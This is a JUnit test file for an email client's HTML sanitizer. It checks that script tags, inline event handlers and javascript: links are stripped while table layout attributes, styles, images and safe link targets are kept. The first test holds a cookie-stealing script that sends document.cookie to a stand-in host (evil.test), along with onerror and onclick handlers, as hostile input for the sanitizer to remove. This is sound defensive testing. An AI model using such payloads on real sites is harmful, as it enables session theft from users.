package com.mailroom.gmail;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The allowlist got considerably wider so that newsletters stop rendering as
 * a text file with links in it. These pin down the half that must not widen:
 * nothing here may let the sender run code.
 */
class HtmlSanitizerTest {

    private final HtmlSanitizer sanitizer = new HtmlSanitizer();

    @Test
    void stripsScriptsEventHandlersAndJavascriptUrls() {
        String clean = sanitizer.sanitize("""
                <script>fetch('https://evil.test/'+document.cookie)</script>
                <a href="javascript:alert(1)" onclick="steal()">click</a>
                <img src="x" onerror="steal()">
                <div onmouseover="steal()">hover</div>
                """);

        assertThat(clean).doesNotContain("script", "javascript:", "onclick", "onerror", "onmouseover");
    }

    @Test
    void keepsThePresentationalAttributesAnEmailsLayoutIsBuiltFrom() {
        String clean = sanitizer.sanitize("""
                <table bgcolor="#2b2b2b" border="0" cellpadding="8" cellspacing="0" align="center">
                  <tr><td bgcolor="#33cc66" align="center" valign="top" class="btn">
                    <a href="https://example.test/bid" style="color:#fff">Bid now</a>
                  </td></tr>
                </table>
                """);

        assertThat(clean)
                .contains("bgcolor=\"#2b2b2b\"", "bgcolor=\"#33cc66\"")
                .contains("cellpadding=\"8\"", "align=\"center\"", "valign=\"top\"", "class=\"btn\"")
                .contains("style=\"color:#fff\"");
    }

    @Test
    void keepsImagesAndStylesheetsForTheFrameToGovern() {
        String clean = sanitizer.sanitize(
                "<style>.cta{background:#33cc66}</style>"
                        + "<img src=\"https://cdn.example.test/logo.png\" width=\"180\" alt=\"logo\">");

        // Whether these ever hit the network is the iframe's CSP to decide,
        // not this class's — stripping <img> here never stopped a tracking
        // pixel in a style attribute anyway.
        assertThat(clean).contains("<style>", "background:#33cc66");
        assertThat(clean).contains("<img", "https://cdn.example.test/logo.png");
    }

    @Test
    void sendsEveryLinkToANewTabWithoutAHandleBackToUs() {
        String clean = sanitizer.sanitize("<a href=\"https://example.test\">open</a>");

        assertThat(clean).contains("rel=\"noopener noreferrer\"", "target=\"_blank\"");
    }
}
